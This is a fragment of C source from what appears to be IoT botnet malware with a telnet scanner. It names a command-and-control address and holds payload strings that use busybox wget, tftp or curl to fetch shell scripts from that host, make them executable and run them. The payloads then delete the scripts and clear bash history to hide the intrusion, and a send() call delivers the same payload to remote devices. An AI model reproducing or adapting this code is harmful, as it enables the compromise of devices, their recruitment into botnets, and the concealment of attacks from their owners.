...
unsigned char *commServer[] = { "45.76.29.203:443" };

char *Busybox_Payload = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 45.76.29.203/bin.sh;chmod 777;sh bin.sh;busybox tftp -g 45.76.29.203 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 45.76.29.203 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history;cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 45.76.29.203/bins.sh;chmod 777;sh bins.sh;busybox tftp -g 45.76.29.203 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 45.76.29.203 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history"; //Telnet Scanner Must implement Busybox.

char *Payload = "cd /tmp/;wget http://45.76.29.203/bins.sh;sh bins.sh;rm -rf bins.sh;cd /tmp/;wget http://45.76.29.203/bin.sh;sh bin.sh;rm -rf bis.sh"; //Normal Payload Without busybox Implemented.



char *BINS_HOST_IP = "45.76.29.203";
        ...
        while(1) {
			...
			case 3:

				{
					...
					if(send(fds[i].fd, "AA\x00\x00AAAA cd /tmp; wget http://45.76.29.203/bins.sh || curl -O http://45.76.29.203/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 45.76.29.203 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 45.76.29.203; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh &\x00'", 407, MSG_NOSIGNAL) < 0)
